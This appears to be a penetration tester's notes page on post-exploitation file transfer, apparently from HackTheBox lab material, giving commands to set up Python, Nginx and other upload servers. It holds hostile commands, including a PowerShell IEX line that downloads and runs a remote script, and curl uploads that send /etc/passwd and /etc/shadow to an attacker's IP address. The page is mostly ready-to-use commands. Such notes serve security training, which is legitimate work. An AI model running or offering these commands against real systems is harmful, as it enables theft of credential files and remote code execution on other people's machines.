---
tags:
  - Post-Exploitation
  - DataTransfer
---

## Python 

```shell-session
python3 -m http.server --directory /home/user/target_files 443
```

### Upload Server

For our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.

```shell-session
pip3 install uploadserver
```

```shell-session
python3 -m uploadserver
```

See [[CRT (Certificate Files)]]

```shell-session
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
#### PowerShell Script to Upload a File to Python Upload Server

```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
```powershell-session
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

#### Linux Upload Multiple Files 

```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Python 2.7

```shell-session
python2.7 -m SimpleHTTPServer
```
# NPM

```
http-server
```

# PHP 

```
php -S 127.0.0.1:8000
```

# Ruby

```shell-session
ruby -run -ehttpd . -p8000
```


# Nginx - Enabling PUT

A good alternative for transferring files to `Apache` is [Nginx](https://www.nginx.com/resources/wiki/) because the configuration is less complicated, and the module system does not lead to security issues as `Apache` can.
#### Change the Owner to www-data

```shell-session
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

#### Create Nginx Configuration File

Create the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents:

```shell-session
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

#### Symlink our Site to the sites-enabled Directory

```shell-session

AlexanderOrley@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

#### Start Nginx

```shell-session
AlexanderOrley@htb[/htb]$ sudo systemctl restart nginx.service
```

If we get any error messages, check `/var/log/nginx/error.log`

#### Remove NginxDefault Configuration

```shell-session
AlexanderOrley@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```

#### Upload File Using cURL

```shell-session
AlexanderOrley@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

```shell-session
AlexanderOrley@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
```